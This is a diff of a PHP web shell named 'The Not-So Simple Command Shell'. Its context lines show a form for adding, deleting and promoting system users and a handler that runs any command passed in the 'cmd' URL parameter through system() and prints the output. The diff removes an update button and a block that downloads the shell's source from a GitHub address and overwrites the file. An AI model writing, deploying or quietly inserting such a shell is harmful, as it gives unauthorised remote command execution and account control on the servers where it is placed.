@@ -49,7 +49,7 @@
 		<br><br>
 		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user.">Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button>
 		</form>
-		<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ<small><form action="?update=true"><button type="submit">update</button></form></small></small></p>
+		<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
 		</div>';
 
 		if (isset($_GET['addUser'])){
@@ -110,11 +110,7 @@
 			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
 			echo (system($_GET['cmd']));
 			echo '</pre>';
-		}
-
- 		if (isset($_GET['update'])&& $_GET['update'] == "true") {
-        file_put_contents("nsscmdshell.php", file_get_contents("https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/nsscmdshell.php"));
-}
+		} 
 		?>
 	</body>
 </html>
